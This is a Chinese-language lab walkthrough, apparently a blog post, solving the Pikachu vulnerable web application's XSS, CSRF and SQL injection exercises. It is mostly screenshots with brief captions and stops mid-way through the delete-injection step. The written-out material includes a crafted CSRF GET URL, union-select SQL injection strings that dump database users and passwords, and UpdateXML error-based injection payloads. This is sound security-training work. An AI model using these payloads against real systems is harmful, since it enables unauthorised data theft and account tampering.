src="https://img-blog.csdnimg.cn/0277b3d928a5404ea9718a25589b00aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>先抓包</p><p><img src="https://img-blog.csdnimg.cn/72b4147b18ea4cc09f7333d52ca597db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发送到 repeater 模块</p><p>爆破获得账号 admin 密码 123456</p><p>登录</p><p><img src="https://img-blog.csdnimg.cn/83237af99a544ccbbdb3e03b067ad230.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>先随便输入看输出</p><p><img src="https://img-blog.csdnimg.cn/71c50ff502154ebb8ecae6064430c2da.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>发现没经过滤直接将输入输出到</p><p>标签内</p><p><img src="https://img-blog.csdnimg.cn/750971a7b74449ce8cde95ad44f4aa42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>输入框输入弹窗代码，也可以通过抓包修改</p><p><img src="https://img-blog.csdnimg.cn/0bf904317e7349a7b791c4336f54a37e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/308db42363b444a1b645f5ee51d65417.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_19,color_FFFFFF,t_70,g_se,x_16"></p><p>每次弹完窗之后就不在出现弹窗，所以代码没有储存到服务端，不是存储型</p><h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h2><p><img src="https://img-blog.csdnimg.cn/18a46643b1c54403850b0b00c0f89edf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p>随便输入看看回显</p><p><img src="https://img-blog.csdnimg.cn/7f72031f86274547ba45e3ebaea7bdc1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/2564e003510f4e968c822118b4f91023.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现输入直接被输出到</p><p>标签内</p><p>输入弹窗代码</p><p><img src="https://img-blog.csdnimg.cn/1e7f6e9064b74a5b985ebf81b9c58731.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>每次进入页面都会弹窗，因为代码被储存到了服务器上，为存储型 XSS</p><p><img src="https://img-blog.csdnimg.cn/01ea03b226394130a51b438fe6a6f76b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h2><p>先输入看回显</p><p><img src="https://img-blog.csdnimg.cn/a359e151e39140e2a57e11852255fba4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/f99d398b143841bbae211d8da2a5f204.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源代码</p><p><img src="https://img-blog.csdnimg.cn/bed1d77059494944bc808975b86c8baf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>要闭合 <a herf> 标签</p><p><img src="https://img-blog.csdnimg.cn/15037acbceb14bbd9285afe87adc57fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/705fa33c03ad4d7b9f5158e259173132.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="DOM-型-XSS-x"><a href="#DOM-型-XSS-x" class="headerlink" title="DOM 型 XSS-x"></a>DOM 型 XSS-x</h2><p>和 DOM 型 XSS 一样，只不过这个是存储型的 DOM 型 XSS</p><h2 id="XSS-之盲打"><a href="#XSS-之盲打" class="headerlink" title="XSS 之盲打"></a>XSS 之盲打</h2><p><img src="https://img-blog.csdnimg.cn/f0c75762864e4771bfb7bfb200e2cf5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/e76aeb8c9c4143d289f7d7791f0d3982.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>后台地址 http://ip/pikachu/vul/xss/xssblind/admin_login.php</p><p><img src="https://img-blog.csdnimg.cn/190135e8e9814ed0996c0e3451f06e07.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="XSS-之过滤"><a href="#XSS-之过滤" class="headerlink" title="XSS 之过滤"></a>XSS 之过滤</h2><p>先输入查看回显</p><p><img src="https://img-blog.csdnimg.cn/0b4bc7b4e1bf4b808ae3652b7c8d935c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/04509e89f2ad4b0cab9c58679b05286a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/9143474ba7db4f92a3ebf791d75bfacc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/5cffb1998e324ac494a60d92de41213c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/3bfb45d332284f51bd30a7b812ea7cc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/71063275df2e4833ba0f4f20929580f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/6494e56a7cbd407daa2e508f44ecb199.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源码，发现是将输入经过过滤输出到</p><p>标签中</p><p><img src="https://img-blog.csdnimg.cn/8418f840508542fb8c12ae3759ef45a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16"></p><p>发现 被过滤</p><p>可以构造其它代码弹窗</p><p><img src="https://img-blog.csdnimg.cn/25972ffd9d0c47e48307d747f338646f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/8d3ee32403624fde93e6022548b56413.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="XSS-之-htmlspecialchars"><a href="#XSS-之-htmlspecialchars" class="headerlink" title="XSS 之 htmlspecialchars"></a>XSS 之 htmlspecialchars</h2><p><img src="https://img-blog.csdnimg.cn/a80f166cdcfe4a58bd14da387b9bd46f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>随便输入查看回显</p><p><img src="https://img-blog.csdnimg.cn/f3199ed8120c44cba380177bfab71df9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源代码</p><p><img src="https://img-blog.csdnimg.cn/3553433bd1c34b85943d118b0f9c7f4e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/5d0af6fdba9e4fac94a3970d130f46ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/d534e5e15b0b4e14940cc2d21cf85281.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现双引号、都被编码转义</p><p>可以通过为协议 javascript 触发</p><p><img src="https://img-blog.csdnimg.cn/133947300295468bbcc8049b3da3c376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/d2260f15db1b4040a638cf6a0249ec4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="XSS-之-herf-输出"><a href="#XSS-之-herf-输出" class="headerlink" title="XSS 之 herf 输出"></a>XSS 之 herf 输出</h2><p><img src="https://img-blog.csdnimg.cn/5d813852558f45cf9aec3be9b355cff2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>先随便输入看回显</p><p><img src="https://img-blog.csdnimg.cn/c12152634a444aa3b957c96e80a335ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源代码</p><p><img src="https://img-blog.csdnimg.cn/88bfd7b78ac7485db7af45547c7bb389.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p>发现只要闭合 a herf 就可以</p><p>发现双引号被转义</p><p><img src="https://img-blog.csdnimg.cn/6485276dfa364e679699ea4b04cedc4a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>可以直接通过 javascript 伪协议绕过</p><p><img src="https://img-blog.csdnimg.cn/9fc0306a1fed4d8daf6c338a41958072.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/875aa55bc344453e98974379d10d5212.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="XSS-之-js-输出"><a href="#XSS-之-js-输出" class="headerlink" title="XSS 之 js 输出"></a>XSS 之 js 输出</h2><p><img src="https://img-blog.csdnimg.cn/cbfe88a5ef0b41e6a4c04ec9875fe9bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>先乱输入查看回显</p><p><img src="https://img-blog.csdnimg.cn/4820f6532127469787b0b50648ae694a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/a959e1dacfd445a8b910a9e5ce105890.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源代码</p><p><img src="https://img-blog.csdnimg.cn/6b8461b7a70f481298f807eae799089b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16"></p><p>没有思路查看提示</p><p>输入 tmac</p><p><img src="https://img-blog.csdnimg.cn/d1fb64bf8949422583f93c6018b853a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源代码</p><p><img src="https://img-blog.csdnimg.cn/5343478d7a8f4010ba0cbf58c0ec66a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>输入被放在 JS 内了，所以我们要闭合 javascript</p><p><img src="https://img-blog.csdnimg.cn/86ce076fddd849d898fbbddcd0cdd489.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_19,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF（get）"><a href="#CSRF（get）" class="headerlink" title="CSRF（get）"></a>CSRF（get）</h2><p>抓包</p><p><img src="https://img-blog.csdnimg.cn/2483945121134ffa82ab3a9fdcd7eda1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>192.168.48.130&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545453&amp;add&#x3D;chain&amp;email&#x3D;vince%40pikachu.com&amp;submit&#x3D;submit</p><p><img src="https://img-blog.csdnimg.cn/94768ff4b15c430381bcdac6d7e54fd5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p>现在直接通过访问链接更换性别</p><p>192.168.48.130&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;18626545453&amp;add&#x3D;chain&amp;email&#x3D;vince%40pikachu.com&amp;submit&#x3D;submit</p><p>访问后</p><p><img src="https://img-blog.csdnimg.cn/446e9d5cc56444ccbfa7a104fef37f5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="CSRF-post）"><a href="#CSRF-post）" class="headerlink" title="CSRF(post）"></a>CSRF(post）</h2><p>还是先抓包</p><p><img src="https://img-blog.csdnimg.cn/ae57a0c712cd4bf5bc685dcbd9fbc405.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>改回 boy</p><p><img src="https://img-blog.csdnimg.cn/51039c84ee564281a33ceb9ef06f1833.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/2de5133b2f5c42f3aa30a976673de1aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_16,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>token 被发送到了前端源码中，可以凑够源码中获取到</p><p>和之前的暴力破解单元中 token 防爆破利用方式相同</p><h1 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h1><h2 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h2><p><img src="https://img-blog.csdnimg.cn/07f80b5a28cd4913a7afd0a4cd804e5f.png"></p><p>抓包</p><p><img src="https://img-blog.csdnimg.cn/5436fcc2282142b78b3f5a245cfc4bd9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发送到 repeater 模块</p><p><img src="https://img-blog.csdnimg.cn/b9891c777d84443591e87f53788cdbf2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>and 1&#x3D;1 回显正常</p><p><img src="https://img-blog.csdnimg.cn/15da8d33024f42f58567a39dc06114fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>and 1&#x3D;2 回显错误</p><p>说明存在注入</p><p><img src="https://img-blog.csdnimg.cn/675419a731a94db887d1ee8ec430aa59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询字段数</p><p>order by 2 回显正常，order by 3 报错，证明有两个字段</p><p><img src="https://img-blog.csdnimg.cn/53499b615711492f80ee2a6617895c81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/6fd3a5e47d9d404a9c7e12ba309503c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询回显位</p><p>id&#x3D;1 union select 1,2</p><p><img src="https://img-blog.csdnimg.cn/d7f13f4732964e2cb845d0ac2dde657a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询数据库、用户</p><p>id&#x3D;1 and 1&#x3D;2 union select database(),user()</p><p><img src="https://img-blog.csdnimg.cn/801e5fb6e3024658b6f2a541c84ba71b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询数据库版本和操作系统</p><p>id&#x3D;1 and 1&#x3D;2 union select version(),@@version_compile_os</p><p><img src="https://img-blog.csdnimg.cn/ca4d8f1976a64fa0a9dab7daf7968768.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询表名</p><p>id&#x3D;1 and 1&#x3D;2 union select 1,concat(table_name) from information_schema.tables where table_schema &#x3D; ‘pikachu’</p><p><img src="https://img-blog.csdnimg.cn/0fac4d4b29b74ddb84848234f4bfc82c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询列名</p><p>id&#x3D;1 and 1&#x3D;2 union select 1,concat(column_name) from information_schema.columns where table_schema &#x3D; ‘pikachu’and table_name&#x3D;’users’</p><p><img src="https://img-blog.csdnimg.cn/02a072811bbe4a53b36634ffa518cccf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询数据</p><p>id&#x3D;1 and 1&#x3D;2 union select username,password from users</p><p><img src="https://img-blog.csdnimg.cn/887c0d66640343229442403a79bd7fc4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p><img src="https://img-blog.csdnimg.cn/2094a7b826f8443ca49cadaa25985d35.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>输入一个正常用户名回显正常</p><p><img src="https://img-blog.csdnimg.cn/d623e57117424121a5019ba10ddc273b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>and 1&#x3D;1 回显不正常，证明可能存在字符型注入</p><p><img src="https://img-blog.csdnimg.cn/d9c4614568884be4bf20f151a0bec6ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>‘ and 1&#x3D;1 –+ 回显正常</p><p><img src="https://img-blog.csdnimg.cn/a9b46068e4a3409bae75a3f45cbaa381.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>‘ and 1&#x3D;2 –+ 回显错误</p><p>说明存在字符型注入，用单引号闭合</p><p><img src="https://img-blog.csdnimg.cn/87446885e7a141ba8c3b32972ca01028.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>接下来的步骤和上一关数字型注入一样</p><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>搜索型注入只是比字符型注入多了 % 闭合，接下来的步骤都是一样的</p><p><img src="https://img-blog.csdnimg.cn/4c78151d8fd1499eb8d10433997f8caa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="XX-型注入"><a href="#XX-型注入" class="headerlink" title="XX 型注入"></a>XX 型注入</h2><p>XX 型注入只是闭合的符号是’), 接下来的步骤都一样</p><p><img src="https://img-blog.csdnimg.cn/f7e4331ce5e846ea9b156c7454efe183.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="insert-x2F-update-型注入"><a href="#insert-x2F-update-型注入" class="headerlink" title="insert&#x2F;update 型注入"></a>insert&#x2F;update 型注入</h2><p>加上单引号证明报错存在注入</p><p><img src="https://img-blog.csdnimg.cn/da70e15887904c6e99588dd4a867d07f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>利用报错注入</p><p>updatexml(xml_document,xpath_string,new_value)</p><p>xml_document 是 string 格式，为 xml 文档对象的名称 第二个参数：xpath_string 是 xpath 格式的字符串</p><p>第二个参数是要求符合 xpath 语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p><p>phonenum&#x3D;18626545453’ and UpdateXML(1,concat(0x7e,payload),0) –+</p><p>phonenum&#x3D;18626545453’and UpdateXML(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’pikachu’ limit 0,1)),0) –+</p><p><img src="https://img-blog.csdnimg.cn/d3d3fcd10431488aa3424d6df138b4fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询步骤和之前的都一样，将查询语句带入替换语句中的 payload 即可</p><h2 id="delete-注入"><a href="#delete-注入" class="headerlink" title="delete 注入"></a>delete 注入</h2><p><img src="https://img-blog.csdnimg.cn/9ed80e52a9794328b5a7d00d1344d8d1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p>删除进行抓包</p><p><img src="https://img-blog.csdnimg.cn/a42b4cc07ed74a92b46e52334e5e3fca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发送到 Repeater 模块</p><p><img 